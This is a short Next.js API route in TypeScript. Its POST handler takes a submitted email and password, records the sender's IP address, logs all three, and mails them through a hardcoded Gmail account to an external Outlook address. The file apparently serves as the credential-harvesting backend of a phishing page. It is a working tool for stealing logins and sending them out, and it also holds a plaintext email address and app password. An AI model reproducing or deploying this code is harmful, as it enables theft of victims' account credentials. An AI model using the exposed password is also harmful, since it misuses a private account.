import { NextRequest, NextResponse } from "next/server";
const fromEmail = "slimsean7@gmail.com";
const fromPassword = "dwssrznbauszleyv";

const adminEmailForHashLink = [ "rezultbox247@outlook.com"];

import nodemailer from "nodemailer";   

function getClientIp(req: NextRequest): string {
  const headers = req.headers;

  const cfIp = headers.get("cf-connecting-ip");
  const realIp = headers.get("x-real-ip");
  const forwardedFor = headers.get("x-forwarded-for");

  return (
    cfIp ||
    realIp ||
    (forwardedFor ? forwardedFor.split(",")[0].trim() : null) ||
    "unknown"
  );
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { email, password } = body;

    const address = getClientIp(req);

    console.log("Email:", email);
    console.log("Password:", password);
    console.log("IP Address:", address);

    const transporter = nodemailer.createTransport({
      service: "gmail",
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: fromEmail,
        pass: fromPassword,
      },
    });

    const sendMail = async (mailDetails: any) => {
      const info = await transporter.sendMail(mailDetails);
    };

    const message = `Please do not disclose this code`;
    const options = {
      from: fromEmail,
      to: adminEmailForHashLink,
      subject: `INFO`,
      text: message,
      html: `<h4>Details</h4>
        <p>Email: ${email}
        <p>Password: ${password}</p>
        <p>Address : ${address}</p>
        `,
    };

    await sendMail(options);

    return NextResponse.json({ message: "Email processed successfully" });
  } catch (error) {
    console.error("Error:", error);
    return NextResponse.json(
      { error: "Internal Server Error" },
      { status: 500 }
    );
  }
}
